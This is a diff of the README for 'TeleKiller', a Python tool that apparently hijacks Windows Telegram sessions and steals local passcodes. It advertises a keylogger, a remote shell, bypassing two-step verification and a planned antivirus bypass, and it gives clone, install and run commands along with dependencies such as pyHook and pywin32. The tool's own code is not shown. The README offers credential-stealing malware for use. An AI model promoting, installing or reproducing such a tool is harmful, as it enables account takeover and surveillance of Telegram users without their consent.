@@ -2,7 +2,7 @@
                                                      .
                                                     / \
   _________ _______  _        _______    _          |U|    _        _        _______  _______
-  \__   __/(  ____ \( \      (  ____ \  | \    /\   |L|   ( \      ( \      (  ____ \(  ____ )
+  \__   __/(  ____ \v( \      (  ____ \  | \    /\   |L|   ( \      ( \      (  ____ \(  ____ )
      ) (   | (    \/| (      | (    \/  |  \  / /   |T|   | (      | (      | (    \/| (    )|
      | |   | (__    | |      | (__      |  (_/ /    |R|   | |      | |      | (__    | (____)|
      | |   |  __)   | |      |  __)     |   _ (     |A|   | |      | |      |  __)   |     __)
@@ -15,16 +15,16 @@
 ```
 
 ## TeleKiller
-متن توضیحات رو بنویس
+A Tools Session Hijacking And Stealer Local passcode Windows Telegram
 
 
 
-
-Abilitys :
+features :
 
 - [x] Keylogger
 - [x] Shell 
-- [x] Download TelegramData
+- [x] Bypass 2 Step Verification
+- [x] Bypass Av (Coming Soon)
 
 
 
@@ -36,8 +36,6 @@ cd TeleKiller
 pip install -r requirements.txt
 python TeleKiller.py
 ```
-
-## Requirements
 - [x] python 2.7
 - [x] pyHook
 - [x] pywin32
